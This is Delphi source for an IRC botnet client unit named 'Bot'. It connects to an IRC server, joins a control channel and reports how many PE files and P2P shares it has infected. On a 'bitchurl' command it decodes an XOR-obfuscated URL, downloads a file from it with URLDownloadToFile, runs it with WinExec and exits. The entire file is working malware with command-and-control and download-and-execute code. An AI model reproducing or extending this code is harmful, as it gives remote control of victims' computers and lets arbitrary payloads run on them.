   unit Bot;

   interface

   Uses
     Windows, Winsock;

   Var
     Addr: TSockAddrIn;
     Sock: TSocket;
     SWSA: TWSAData;

     pe_infect: Integer;
     p2p_found: Integer;
     p2p_names: String;
     p2p_infect: Integer;
     silence: Bool;

     Procedure CreateBot(Server: String);
     Procedure SendData(Text: String);
     function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   implementation

   function InttoStr(const Value: integer): string;
   var
     S: string[11];
   begin
     Str(Value, S);
     Result := S;
   end;

   Procedure SendData(Text: String);
   Begin
     If Sock <= 0 Then Exit;
     If (Pos('PRIVMSG ##p#.k#& :', Text) > 0) and (Silence) Then Exit;
     Send(Sock, Text[1], Length(Text), 0);
   End;

   Function CreateName: String;
   Begin
     Randomize;              //12345678
     Result := 'B';
     While Length(Result) < 8 Do
       Result := Result + IntToStr(Random(9));
     Result := Result+'h';
   End;

   Function EncryptStr(Str: String): String;
   Var
     I: Integer;
     C: Integer;
   Begin
     Result := '';
     For I := 1 To Length(Str) Do
     Begin
       C := Ord(Str[i]);
       C := (C Xor 1) Xor 6;
       Result := Result + Chr(C);
     End;
   End;

   Procedure ReadData;
   Var
     I   : Integer;
     Data: Array[0..1600] Of Char;
     Temp: String;
     Tmp : String;
   Begin
     While Recv(Sock, Data, 1600, 0) > 0 Do
     Begin
       Temp := Data;
       ZeroMemory(@Data, SizeOf(Data));

       If Pos('MOTD', Temp) > 0 Then
       Begin
         SendData('JOIN ##p#.k#& '+#10);
       End;

       If Pos('PING :', Temp) > 0 Then
       Begin
         Temp := Copy(Temp, Pos('PING :', Temp), length(Temp));
         Temp := Copy(Temp, 1, Pos(#10, Temp)-1);
         If Temp[Length(Temp)] = #13 Then
         Temp := Copy(Temp, 1, Length(Temp)-1);
         Delete(Temp, 2, 1);
         Insert('O', Temp, 2);
         SendData(Temp+#10);
       End;

       If pos('shutup', Temp) > 0 Then Silence := True;
       If Pos('shutdown', Temp) > 0 Then Silence := False;

       If Pos('p2pbiatch', Temp) > 0 Then
       Begin
         SendData('PRIVMSG ##p#.k#& :Infected P2P '+IntToStr(p2p_infect)+' | P2P Found '+
                  IntToStr(p2p_found)+' | Softwares '+P2p_Names+#10);
       End;

       If Pos('statusbiatch', Temp) > 0 Then
       Begin
         SendData('PRIVMSG ##p#.k#& :Infected Files '+IntToStr(pe_infect)+#10);
       End;

       If Pos('bitchurl :', Temp) > 0 Then
       Begin
         Temp := Copy(Temp, Pos('url :',Temp), Length(Temp));
         Temp := Copy(Temp, Pos(':',Temp)+1, Length(Temp));
         Tmp := 'C:\'+CreateName+'.exe';
         If Temp[Length(Temp)] = #10 Then Temp := Copy(Temp, 1, Length(Temp)-1);
         If Temp[Length(Temp)] = #13 Then Temp := Copy(Temp, 1, Length(Temp)-1);
         Temp := EncryptStr(Temp);
         URLDownloadToFile(0, pChar(Temp), pChar(Tmp), 0, 0);
         WinExec(pChar(Tmp), 1);
         SendData('PRIVMSG ##p#.k#& :File Downloaded && Executed'#10);
         ExitProcess(0);
       End;

     End;
   End;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   Procedure CreateBot(Server: String);
   Var
     Name: String;
   Begin
     WSAStartUp(makeword(2,1), SWSA);

     Sock := Socket(af_inet, sock_stream, 0);
     If Sock = -1 Then Exit;

     Addr.sin_family := af_inet;
     Addr.sin_port := htons(6667);
     Addr.sin_addr.S_addr := inet_addr(pChar(IpStr(Server)));

     If Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
     Begin
       Name := CreateName;
       SendData('USER '+Name+' '+Name+'@mailshit.com "win2k" :'+Name+#10);
       SendData('NICK '+Name+#10);
       ReadData;
     End;

     WSACleanUp();
   End;

   end.
